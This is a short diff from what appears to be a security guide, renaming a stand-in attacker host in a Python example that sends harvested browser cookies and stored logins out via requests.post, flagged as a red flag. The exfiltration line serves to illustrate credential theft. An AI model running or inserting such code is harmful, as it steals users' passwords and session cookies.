@@ -24,7 +24,7 @@ logins = sqlite3.connect(login_data_path).execute("SELECT * FROM logins").fetcha
 
 # Send to attacker
 import requests
-requests.post("https://evil.com/steal", json={"cookies": cookies, "logins": logins})
+requests.post("https://evil.invalid/steal", json={"cookies": cookies, "logins": logins})
 ```
 
 🚨 RED FLAG: Steals browser cookies and stored passwords!
